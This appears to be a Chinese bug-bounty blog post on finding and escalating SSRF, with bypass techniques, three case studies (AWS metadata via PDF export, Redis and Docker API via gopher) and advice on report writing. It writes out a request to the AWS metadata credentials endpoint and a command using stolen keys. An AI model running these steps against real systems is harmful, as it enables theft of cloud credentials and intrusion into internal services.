我验证过的方法论

阶段 1：发现

  • 映射所有 URL 参数：使用 Burp Suite Pro 的 “Discover content” 和 ParamMiner
  • 测试文件上传替代方案：寻找”从 URL 获取”选项
  • 检查 webhooks：集成页面、通知设置
  • 审查 API 文档：Swagger/OpenAPI 规范经常会泄露参数

阶段 2：验证

阶段 3：绕过测试

  • 测试所有 localhost 变体
  • 尝试协议走私（file://、gopher://、dict://）
  • 按需设置 DNS 重绑定
  • 测试编码绕过

阶段 4：影响升级

  • 云元数据：AWS/Azure/GCP
  • 内部网络扫描：发现服务
  • 利用已知服务：Redis、Elasticsearch、Docker 等
  • 与其他漏洞组合利用：XXE、CRLF、open redirects

真实案例研究

案例 1：通过 PDF 导出访问 AWS 元数据

场景：具有服务端 PDF 生成功能的 SaaS 平台
漏洞链：

  1. 在 /api/export/pdf 的 template_url 参数中发现 SSRF
  2. 使用 127.0.0.1.nip.io 绕过 localhost 限制
  3. 成功访问 AWS 元数据 API
  4. 从元数据端点提取 IAM 凭证
  5. 展示了枚举 AWS 资源的能力
  6. 以严重级别提交报告，并附完整修复方案
    核心要点：PDF 生成器通常放宽了安全控制，因为它们的设计目的就是获取远程资源。它们是 SSRF 测试的绝佳目标。

案例 2：通过 Webhook SSRF 利用 Redis

场景：具有 webhook 集成功能的应用
漏洞链：

  1. 在 webhook URL 配置中发现 SSRF
  2. 内部网络端口扫描发现内部网络上的 Redis
  3. 使用 Gopher 协议发送 Redis 命令
  4. 展示了向 Redis 写入任意数据的能力
  5. 通过 cron job 注入展示了 RCE 潜力
  6. 附上网络拓扑文档提交严重级别报告
    核心要点：Webhook 功能通常被信任且输入校验较少。它们值得深入测试。

案例 3：图片处理中的 Blind SSRF

场景：具有图片优化功能的电商平台
漏洞链：

  1. 在图片获取功能中发现 Blind SSRF
  2. 基于时间的分析揭示了开放的内部端口
  3. 在端口 2375 检测到 Docker API
  4. 构造用于容器创建的 Gopher payload
  5. 展示了挂载宿主机文件系统的能力
  6. 通过细致的测试证明了 RCE 能力
    核心要点：Blind SSRF 需要创造力，但同样可以达到严重级别。基于时间的检测和带外回调是不可或缺的技术。

撰写报告：最大化影响

什么才是一份优秀的严重级别 SSRF 报告

糟糕的报告：

标题：SSRF in /api/fetch
步骤：发送 GET 请求到 /api/fetch?url=http://169.254.169.254
影响：可以访问元数据

严重级别的报告：

标题：SSRF 导致通过 IAM 凭证提取完全接管 AWS 账户

摘要：
PDF 导出功能中的 SSRF 漏洞允许攻击者访问 AWS 实例元数据、提取 IAM 凭证，并接管整个 AWS 基础设施。

复现步骤：

  1. 导航到 /dashboard/export
  2. 拦截 PDF 生成请求
  3. 将 template_url 修改为：http://127.0.0.1.nip.io/169.254.169.254/latest/meta-data/iam/security-credentials/prod-role
  4. 在响应中观察到 IAM 凭证

影响展示：

  • 提取的 AccessKeyId：AKIA…
  • 提取的 SecretAccessKey：（报告中已脱敏）
  • 使用 AWS CLI 测试：aws s3 ls –profile stolen
  • 发现 50+ 个包含客户数据的 S3 bucket
  • 展示了对生产数据库备份的读取权限

推荐修复方案：

  1. 实施严格的 URL 白名单
  2. 使用 AWS IMDSv2 并要求 token
  3. 禁用不必要的内部网络访问
  4. 添加出站流量过滤

发现 SSRF 方法总结

  • PDF 生成器是高价值目标——它们执行 JavaScript、加载外部资源，且通常缺乏 SSRF 防护
  • Webhooks 值得更多关注——很多猎人只测试 XSS，却忽视了 SSRF 的潜力
  • 基于时间的检测非常强大——当无法看到响应时，时间差异可以揭示开放的端口和服务
  • 影响来自于链条组合——单独的 SSRF 可能只是中等严重级别，但 SSRF → RCE 就变成了严重级别
  • 云元数据无处不在——AWS、Azure、GCP 都暴露了类似的元数据端点，这些都是高价值目标
  • 文档会泄露秘密——API 文档经常会暴露值得测试的隐藏参数
  • 平衡自动化和手动测试——工具发现常见问题，但手动的创造力才能发现严重级别的漏洞
  • 上下文决定严重级别——同样的技术缺陷，在不同环境下可能产生截然不同的影响

反思

SSRF 漏洞代表着一种严重的安全隐患，可能暴露一个组织的整个基础设施。一个看似简单的服务端请求，可以成为通往云凭证、内部服务甚至远程代码执行的路径。

本文中的技术基于多年的研究、对已公开漏洞的学习，以及在授权环境中的实际测试。从发现基本 SSRF 到实现严重级别影响之间的差距，在于理解目标的架构并创造性地串联你的访问路径。

请记住：始终在经过授权的目标上进行道德测试。未经许可绝不访问任何系统。遵循负责任的披露规范。
